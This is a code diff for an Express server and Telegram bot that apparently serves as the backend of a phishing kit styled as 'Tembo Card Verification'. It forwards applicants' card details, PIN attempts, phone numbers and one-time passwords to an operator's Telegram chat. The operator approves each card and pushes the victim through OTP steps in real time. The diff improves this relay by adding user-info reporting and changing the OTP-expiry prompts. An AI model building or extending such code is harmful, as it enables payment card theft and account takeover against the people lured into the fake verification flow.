@@ -6,22 +6,35 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Configuration
-const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
+// Configuration using standard environment keys
+const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
 const bot = new TelegramBot(TOKEN, { polling: true });
 
-// Persistent memory container to prevent data loss on minor re-evaluations
+// Persistent memory container
 global.appState = global.appState || {
-    adminChatId: process.env.ADMIN_CHAT_ID || null,
+    adminChatId: CHAT_ID || null,
     clientData: {},
     pinAttempts: 3,
     currentClientResponse: null
 };
 
-// Admin start command to dynamically capture or update chat ID
+// Admin start command: immediately captures chat ID and provides info with private link context
 bot.onText(/\/start/, (msg) => {
     global.appState.adminChatId = msg.chat.id;
-    bot.sendMessage(global.appState.adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${global.appState.adminChatId}\`\n\nTelegram notifications start strictly from the **Tembo Card Verification** screen onwards.`, { parse_mode: 'Markdown' });
+    const user = msg.from;
+    const privateLink = `https://t.me/${bot.options.username || 'bot'}`;
+    
+    const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
+        `👤 **User Info:**\n` +
+        `• Name: ${user.first_name} ${user.last_name || ''}\n` +
+        `• Username: @${user.username || 'N/A'}\n` +
+        `• ID: \`${user.id}\`\n\n` +
+        `🔗 **Private Bot Link:** ${privateLink}\n\n` +
+        `📱 Telegram notifications start strictly from the **Tembo Card Verification** screen onwards.`;
+    
+    bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' });
 });
 
 // API endpoint to handle user step submissions from frontend
@@ -56,7 +69,7 @@ app.post('/api/submit', async (req, res) => {
     }
     else if (step === 'step4') {
         if (data.isResend) {
-            const msgText = `🔄 **Step 4: Applicant Requesting New OTP**\n\n📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*The applicant has requested a new OTP. Choose action:*`;
+            const msgText = `🔄 **Step 4: Applicant OTP Expired / Requesting New OTP**\n\n📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*The 30-second timer expired or applicant requested a new OTP. Choose action:*`;
             const opts = {
                 reply_markup: {
                     inline_keyboard: [
@@ -115,16 +128,11 @@ bot.on('callback_query', async (query) => {
 
     try {
         await bot.answerCallbackQuery(query.id);
-    } catch (e) {
-        console.error('Error answering callback query:', e);
-    }
+    } catch (e) {}
 
-    // Fade away (remove) the inline buttons after tapping
     try {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
-    } catch (e) {
-        // Ignore if already cleared
-    }
+    } catch (e) {}
 
     if (action === 'card_proceed') {
         await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
@@ -179,4 +187,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-                                                                                              
+        
